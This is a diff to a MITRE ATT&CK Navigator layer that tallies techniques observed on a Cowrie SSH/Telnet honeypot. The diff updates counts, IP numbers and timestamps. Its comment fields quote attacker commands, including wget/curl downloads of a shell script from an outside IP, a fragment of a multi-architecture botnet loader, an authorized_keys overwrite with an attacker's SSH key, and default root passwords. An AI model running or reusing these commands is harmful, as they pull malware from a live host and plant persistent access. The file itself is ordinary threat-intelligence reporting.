@@ -6,7 +6,7 @@
     "layer": "4.5"
   },
   "domain": "enterprise-attack",
-  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-09-21 07:01:43",
+  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-09-21 08:00:43",
   "filters": {
     "platforms": [
       "Linux"
@@ -22,9 +22,9 @@
   "techniques": [
     {
       "techniqueID": "T1110.001",
-      "score": 1160,
+      "score": 1770,
       "enabled": true,
-      "comment": "1160 observation(s) from 37 unique IP(s). e.g. root / 654321",
+      "comment": "1770 observation(s) from 43 unique IP(s). e.g. root / 654321",
       "metadata": [
         {
           "name": "tactic",
@@ -32,7 +32,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "37"
+          "value": "43"
         },
         {
           "name": "first seen",
@@ -40,15 +40,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-09-21T07:01:37"
+          "value": "2026-09-21T07:59:21"
         }
       ]
     },
     {
       "techniqueID": "T1078",
-      "score": 326,
+      "score": 332,
       "enabled": true,
-      "comment": "326 observation(s) from 28 unique IP(s). e.g. root / root",
+      "comment": "332 observation(s) from 33 unique IP(s). e.g. root / root",
       "metadata": [
         {
           "name": "tactic",
@@ -56,7 +56,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "28"
+          "value": "33"
         },
         {
           "name": "first seen",
@@ -64,15 +64,111 @@
         },
         {
           "name": "last seen",
-          "value": "2026-09-21T06:54:09"
+          "value": "2026-09-21T07:58:05"
         }
       ]
     },
     {
       "techniqueID": "T1083",
-      "score": 292,
+      "score": 293,
       "enabled": true,
-      "comment": "292 observation(s) from 10 unique IP(s). e.g. ls -lh $(which ls)",
+      "comment": "293 observation(s) from 11 unique IP(s). e.g. ls -lh $(which ls)",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "11"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-09-21T00:43:41"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-09-21T07:11:55"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 82,
+      "enabled": true,
+      "comment": "82 observation(s) from 16 unique IP(s). e.g. cat /proc/cpuinfo | grep name | wc -l",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "16"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-09-21T00:43:34"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-09-21T07:36:27"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 45,
+      "enabled": true,
+      "comment": "45 observation(s) from 14 unique IP(s). e.g. cd /tmp;rm -rf wget.sh; wget http://58.211.144.243:800/wget.sh; busybox wget http://58.211.144.243:800/wget.sh; curl -O ",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Command and Control"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "14"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-09-21T00:19:23"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-09-21T07:49:50"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 40,
+      "enabled": true,
+      "comment": "40 observation(s) from 14 unique IP(s). e.g. #!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Defense Evasion"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "14"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-09-21T00:19:31"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-09-21T07:49:50"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1033",
+      "score": 18,
+      "enabled": true,
+      "comment": "18 observation(s) from 10 unique IP(s). e.g. w",
       "metadata": [
         {
           "name": "tactic",
@@ -84,91 +180,19 @@
         },
         {
           "name": "first seen",
-          "value": "2026-09-21T00:43:41"
+          "value": "2026-09-21T00:43:44"
         },
         {
           "name": "last seen",
-          "value": "2026-09-21T06:54:10"
+          "value": "2026-09-21T07:48:59"
         }
       ]
     },
     {
-      "techniqueID": "T1082",
-      "score": 71,
+      "techniqueID": "T1057",
+      "score": 16,
       "enabled": true,
-      "comment": "71 observation(s) from 13 unique IP(s). e.g. cat /proc/cpuinfo | grep name | wc -l",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Discovery"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "13"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-09-21T00:43:34"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-09-21T06:43:09"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1105",
-      "score": 41,
-      "enabled": true,
-      "comment": "41 observation(s) from 12 unique IP(s). e.g. cd /tmp;rm -rf wget.sh; wget http://58.211.144.243:800/wget.sh; busybox wget http://58.211.144.243:800/wget.sh; curl -O ",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Command and Control"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "12"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-09-21T00:19:23"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-09-21T05:05:18"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1222.002",
-      "score": 23,
-      "enabled": true,
-      "comment": "23 observation(s) from 12 unique IP(s). e.g. #!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Defense Evasion"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "12"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-09-21T00:19:31"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-09-21T05:05:18"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1033",
-      "score": 15,
-      "enabled": true,
-      "comment": "15 observation(s) from 8 unique IP(s). e.g. w",
+      "comment": "16 observation(s) from 8 unique IP(s). e.g. crontab -l",
       "metadata": [
         {
           "name": "tactic",
@@ -177,30 +201,6 @@
         {
           "name": "unique source IPs",
           "value": "8"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-09-21T00:43:44"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-09-21T06:05:13"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1057",
-      "score": 14,
-      "enabled": true,
-      "comment": "14 observation(s) from 7 unique IP(s). e.g. crontab -l",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Discovery"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "7"
         },
         {
           "name": "first seen",
@@ -208,15 +208,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-09-21T04:23:44"
+          "value": "2026-09-21T07:12:01"
         }
       ]
     },
     {
       "techniqueID": "T1098.004",
-      "score": 8,
+      "score": 9,
       "enabled": true,
-      "comment": "8 observation(s) from 8 unique IP(s). e.g. cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+      "comment": "9 observation(s) from 9 unique IP(s). e.g. cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
       "metadata": [
         {
           "name": "tactic",
@@ -224,7 +224,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "8"
+          "value": "9"
         },
         {
           "name": "first seen",
@@ -232,7 +232,7 @@
         },
         {
           "name": "last seen",
-          "value": "2026-09-21T04:23:13"
+          "value": "2026-09-21T07:11:42"
         }
       ]
     },
@@ -316,7 +316,7 @@
       "#f85149"
     ],
     "minValue": 0,
-    "maxValue": 1160
+    "maxValue": 1770
   },
   "legendItems": [
     {
